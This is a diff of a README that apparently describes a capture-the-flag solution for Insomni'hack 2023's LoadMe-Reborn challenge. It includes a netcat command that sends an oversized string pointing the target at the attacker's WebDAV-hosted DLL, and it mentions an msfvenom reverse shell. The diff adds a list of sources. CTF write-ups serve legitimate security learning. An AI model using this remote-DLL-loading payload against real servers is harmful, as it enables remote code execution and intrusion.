@@ -1,6 +1,6 @@
 # Insomni'hack - LoadMe-Reborn   
 This repository is a solution for the flag LoadMe-Reborn for 2023's editions of insomni'hack.   
-## The start   
+## The flag   
 The flags begin with a simple instructions, that someone had developped an application to do a recipe with given components. They give us a nc command so we can connect to this app :
 (I have forgot the command that they gave us, but it should be like this one)
 ```
@@ -34,3 +34,10 @@ And the you can launch your DLL on the server with this command :
 echo '(stringlongenoughtodotheerror)//youripadress@80/msf' | nc 10.1.2.13 1234
 ```
 It'll launch the nc command and the enter the string between the '' after the echo. Now in the shell where you have executed the reverse shell command, you have to the server and get the flag who is in the .txt file !
+## Sources
+msfvenom : 
+* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
+* https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html
+
+wsgidav :
+* https://wsgidav.readthedocs.io/en/latest/
